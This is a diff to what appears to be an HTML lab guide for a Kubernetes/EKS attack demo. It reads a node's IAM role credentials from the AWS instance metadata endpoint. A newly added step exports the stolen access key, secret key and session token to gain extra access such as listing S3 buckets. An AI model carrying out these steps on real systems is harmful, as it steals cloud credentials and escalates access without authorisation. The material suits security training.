@@ -79,9 +79,18 @@ kubectl create -f service_k8s_attack.yaml
 <p>http://169.254.169.254/latest/meta-data/iam/security-credentials/FortiCNPEKS1-NodeInstanceRole-BDYEZXD9YLRB</p>
 </li>
 
-<li>5. You will get the security credentials. See in the image below.
+<li>5. You will get the security credentials. As you can see in the image below.
 <img src='/security_credentials.PNG'>
-
-
 </li>
+
+<li>6. You can use it to have aditional access. For instance, list S3 buckets available in your AWS account.
+<p>First, you can verify that you are not allowed to list S3 buckets with the current credential</p>
+<p>aws s3 ls</p>
+<p>Replace your AWS credentials with the Access Key, Secret Key and Token from the previous step </p>
+<p> export AWS_ACCESS_KEY_ID="New_Access_Key"</p>
+<p> export AWS_SECRET_ACCESS_KEY="New_Secret_Key"</p>
+<p> export AWS_SESSION_TOKEN="Token"</p>
+</li>
+<img src='/new_access_credentials.PNG'>
+
 </ul>
